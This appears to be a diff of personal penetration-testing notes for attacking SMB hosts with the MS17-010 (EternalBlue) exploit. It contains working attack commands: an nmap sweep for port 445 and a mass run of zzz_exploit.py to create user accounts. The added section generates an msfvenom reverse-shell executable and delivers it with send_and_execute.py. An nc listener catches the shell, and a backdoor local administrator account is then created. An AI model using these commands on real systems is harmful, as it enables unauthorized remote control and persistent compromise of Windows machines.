@@ -10,8 +10,7 @@ nmap --open -p 445 -iL livehosts.txt -oG - | awk '/Up$/{print $2}' > smb-hosts.t
 
 Use the .zip in the repo, it works.
 
--or-
-
+########Alternative
 git clone https://github.com/mez-0/MS17-010-Python
 	-As of 25JAN20, need to add global var to zzz_exploit.py, just add "  domain = ''    " after includes
 	-Also need to add "    found_pipe = ''   " to found_pipe func, its broken in the current mez-0 version, fixed in my zip
@@ -25,3 +24,19 @@ cat ../smb-hosts.txt | xargs -L 1 -I {} ./zzz_exploit.py -t {} -c 'net user /add
 
 #smbmap checker for above, looking for "Shared", "Users", etc for it to work. Admin rights might not work, but should create lowpriv foothold account at least.
 cat ../smb-hosts.txt | xargs -L 1 -I {} smbmap -u chonker -p kitten -H {}
+
+
+
+#############Alternative
+#try different ports, asa/firewall might snag weird ports, 5150 usually works ok
+
+git clone https://github.com/helviojunior/MS17-010 
+msfvenom -p windows/shell_reverse_tcp LHOST={local atk IP} LPORT=5150 EXITFUNC=thread -f exe -a x86 --platform windows -o kittenrevsh.exe
+send_and_execute.py $ip kittenrevsh.exe
+
+#new tab# 
+nc -nlvp 443
+#grab the shell if possible, check tshark on revsh port if thats acting squirrel
+#if shell pops, build new user asap and try privesc
+net user /add chonker 5150kitten
+net localgroup administrators chonker /add
